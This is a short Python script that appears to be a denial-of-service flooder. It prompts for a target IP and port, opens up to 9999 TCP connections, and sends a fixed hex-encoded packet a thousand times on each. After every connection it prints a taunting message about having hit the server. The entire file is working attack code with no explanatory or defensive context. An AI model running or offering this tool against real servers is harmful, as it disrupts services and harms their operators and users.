import socket
import time

ip = input("IP: ")
port = int(input("Port: "))
num_connections = 9999

packet = bytes.fromhex("F10400020900000001000000F3")
num_send_per_connection = 1000

for _ in range(num_connections):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((ip, port))
            
            for _ in range(num_send_per_connection):
                s.sendall(packet)
            
            print(f"Done Fuck Server {ip} <3")
        except Exception as e:
            print(f"Error: {e}")

        time.sleep(0)
